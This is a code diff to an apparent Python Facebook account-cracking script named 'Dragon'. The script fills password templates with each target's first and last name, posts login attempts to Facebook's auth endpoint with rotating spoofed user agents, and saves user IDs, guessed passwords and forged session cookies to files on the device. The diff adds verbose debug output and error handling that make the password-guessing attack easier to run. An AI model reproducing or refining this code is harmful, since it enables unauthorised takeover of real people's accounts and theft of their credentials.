@@ -4,6 +4,7 @@ import base64
 import os
 import sys
 import random
+import json
 
 # Colors
 R = '\033[1;91m'  # Red
@@ -19,7 +20,7 @@ loop = 0
 def randBuildvsskj():
     ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_31"])
     END = "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/'+'{density=3.0,width=1080,height=1776}'+';FBLC/en_'+'US;'+'FBCR/Vi'+'deo'+'tr'+'on;FBMF/m'+'otor'+'ola;FBBD/mo'+'tor'+'ola;FBPN/com.facebook.katana;FBDV/X'+'T156'+'3;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]"
-    ua = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/120.0.2210.150 Version/17.0 Mobile/15E148 Safari/604.1","Mozilla/5.0 (iPod; U; CPU iPhone OS 4_1 like Mac OS X; vi-VN) AppleWebKit/535.47.5 (KHTML, like Gecko) Version/3.0.5 Mobile/8B117 Safari/6535.47.5","Mozilla/5.0 (iPad; CPU OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/605.1.15","Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/119.0.2151.78 Version/17.0 Mobile/15E148 Safari/604.1","Mozilla/5.0 (iPod; U; CPU iPhone OS 3_3 like Mac OS X; gl-ES) AppleWebKit/535.41.6 (KHTML, like Gecko) Version/3.0.5 Mobile/8B112 Safari/6535.41.6","Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1","Mozilla/5.0 (iPod; U; CPU iPhone OS 4_1 like Mac OS X; ur-PK) AppleWebKit/533.16.6 (KHTML, like Gecko) Version/3.0.5 Mobile/8B115 Safari/6533.16.6","Mozilla/5.0 (iPhone; CPU iPhone OS 18_6_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/141.0.3537.72 Version/18.0 Mobile/15E148 Safari/604.1","Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5","Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5","Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10","Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_1_3 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7E18 Safari/528.16","Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; es-es) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5","Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e","Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; es-es) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5","Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1","Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1","Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1","Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5","Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5","Mozilla/5.0 (Linux; Android 13; motorola edge 30 neo Build/T1SSM33.1-121-4) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 GNews Android/2022140634","Mozilla/5.0 (iPad; CPU OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20F75 [FBAN/FBIOS;FBDV/iPad13,8;FBMD/iPad;FBSN/iPadOS;FBSV/16.5.1;FBSS/2;FBID/tablet;FBLC/nl_NL;FBOP/5]","Mozilla/5.0 (Linux; Android 13; SM-S908B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]","Mozilla/5.0 (Linux ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 OPR/46.0.2207.0 OMI/4.20.5.61.LIMA.179 Model/Vestel-MB180 VSTVB MB100 FVC/5.0 (LUXOR; MB180; ) HbbTV/1.5.1 (+DRM; LUXOR; MB180; 1.64.1.0; ; _TV_G32_2020;) SmartTvA/3.0.0","Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A035G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; SM-N960F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 GNews Android/2022143610","Mozilla/5.0 (Linux; Android 12; SM-G975F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]","Mozilla/5.0 (Linux; 4.4.2; LG-X145) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro Build/SKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.210 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]","Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 GNews Android/2022143610","Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/271.3.546369769 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; SM-T595 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]","Mozilla/5.0 (Linux; arm_64; Android 10; BMH-AN10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 YaBrowser/23.5.5.61.00 SA/3 Mobile Safari/537.36","Mozilla/5.0 (Linux; arm_64; Android 10; YAL-L41) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaApp_Android/23.70.1 YaSearchBrowser/23.70.1 BroPP/1.0 SA/3 Mobile Safari/537.36","Mozilla/5.0 (Linux; arm_64; Android 11; M2010J19CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 YaBrowser/23.5.5.53.00 SA/3 Mobile Safari/537.36"])+END
+    ua = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/120.0.2210.150 Version/17.0 Mobile/15E148 Safari/604.1","Mozilla/5.0 (iPod; U; CPU iPhone OS 4_1 like Mac OS X; vi-VN) AppleWebKit/535.47.5 (KHTML, like Gecko) Version/3.0.5 Mobile/8B117 Safari/6535.47.5","Mozilla/5.0 (iPad; CPU OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/605.1.15","Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/119.0.2151.78 Version/17.0 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Linux; Android 13; motorola edge 30 neo Build/T1SSM33.1-121-4) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 GNews Android/2022140634","Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A035G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro Build/SKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.210 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]"])+END
     return ua
 
 class CookieGetter:
@@ -44,6 +45,8 @@ class CookieGetter:
             # Try each password
             for pw in psw:
                 ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last', ls).replace('Name', name).replace('name', name.lower())
+                
+                print(f"\n{A}[*] Trying password: {ps}{W}")
                 
                 with requests.Session() as session:
                     # Request data
@@ -97,13 +100,32 @@ class CookieGetter:
                     
                     # Make request
                     try:
-                        q = session.post(
+                        print(f"{A}[*] Sending request...{W}")
+                        response = session.post(
                             "https://b-graph.facebook.com/auth/login",
                             data=data,
                             headers=headers,
                             allow_redirects=False,
                             timeout=20
-                        ).json()
+                        )
+                        
+                        print(f"{A}[*] Response Status: {response.status_code}{W}")
+                        print(f"{A}[*] Response Length: {len(response.text)}{W}")
+                        
+                        # Try to parse JSON
+                        try:
+                            q = response.json()
+                            print(f"{A}[*] Response JSON Keys: {list(q.keys())}{W}")
+                            
+                            # Debug: print full response for first attempt
+                            if loop == 0:
+                                print(f"{A}[DEBUG] Full Response:{W}")
+                                print(json.dumps(q, indent=2)[:500])
+                            
+                        except json.JSONDecodeError:
+                            print(f"{R}[!] Failed to parse JSON. Response text:{W}")
+                            print(response.text[:500])
+                            continue
                         
                         # Check response
                         if 'session_key' in q:
@@ -112,7 +134,7 @@ class CookieGetter:
                             Dragonb = base64.b64encode(os.urandom(18)).decode().replace("=", "").replace("+", "_").replace("/", "-")
                             cookie = f"sb={Dragonb};{ckkk}"
                             
-                            print(f"\r{R} [Dragon-OK] {sid} | {ps} {S}")
+                            print(f"\n{R} [Dragon-OK] {sid} | {ps} {S}\n")
                             oks.append(sid)
                             
                             # Save results
@@ -122,19 +144,29 @@ class CookieGetter:
                                 f.write(f'{sid}|{ps}|{cookie}\n')
                             break
                             
-                        elif 'error' in q and 'www.facebook.com' in str(q.get('error', {}).get('message', '')):
-                            # Checkpoint
-                            cps.append(sid)
-                            with open('/sdcard/Dragon_CP.txt', 'a') as f:
-                                f.write(f'{sid}|{ps}\n')
-                            break
+                        elif 'error' in q:
+                            error_msg = q.get('error', {}).get('message', '')
+                            print(f"{R}[!] Error: {error_msg}{W}")
+                            
+                            if 'www.facebook.com' in str(error_msg):
+                                # Checkpoint
+                                print(f"{A}[Dragon-CP] {sid} | {ps}{W}")
+                                cps.append(sid)
+                                with open('/sdcard/Dragon_CP.txt', 'a') as f:
+                                    f.write(f'{sid}|{ps}\n')
+                                break
                         else:
+                            print(f"{A}[!] Unknown response format{W}")
                             continue
                             
                     except requests.exceptions.Timeout:
-                        print(f"\r{A} [Timeout] Retrying... {S}")
+                        print(f"{R}[!] Timeout - Retrying...{W}")
+                        continue
+                    except requests.exceptions.ConnectionError as e:
+                        print(f"{R}[!] Connection Error: {str(e)}{W}")
                         continue
                     except Exception as e:
+                        print(f"{R}[!] Error: {str(e)}{W}")
                         continue
             
             loop += 1
@@ -143,6 +175,7 @@ class CookieGetter:
             # Retry on connection error
             self.methodA(sid, name, psw)
         except Exception as e:
+            print(f"{R}[!] Fatal Error: {str(e)}{W}")
             loop += 1
 
 # Main execution
